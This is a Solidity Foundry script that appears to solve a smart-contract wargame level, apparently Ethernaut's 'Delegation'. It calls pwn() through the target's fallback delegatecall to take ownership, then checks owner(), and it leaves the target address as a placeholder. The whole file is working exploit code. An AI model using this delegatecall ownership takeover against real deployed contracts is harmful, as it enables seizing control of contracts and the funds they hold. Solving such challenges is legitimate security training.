// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract AttackDelegation is Script {
    address internal constant VICTIM = address(0x0); // TODO: Set your instance address

    function run() public {
        // Since 'pwn()' is not a function on the Delegation contract but it implements a fallback function
        // the contract will call the fallback function with the very same calldata we used, in this case the 'pwn()' function selector.
        bytes4 selector = bytes4(keccak256(abi.encodePacked("pwn()")));
        vm.startBroadcast();
        (bool success,) = VICTIM.call(abi.encodeWithSelector(selector));
        require(success, "failed to pwn victim");
        selector = bytes4(keccak256(abi.encodePacked("owner()")));
        (bool success1, bytes memory data) = VICTIM.call(abi.encodeWithSelector(selector));
        require(success1, "failed to call owner()");
        vm.stopBroadcast();
        address newOwner = abi.decode(data, (address));
        require(newOwner == msg.sender, "failed to set the owner");
    }
}
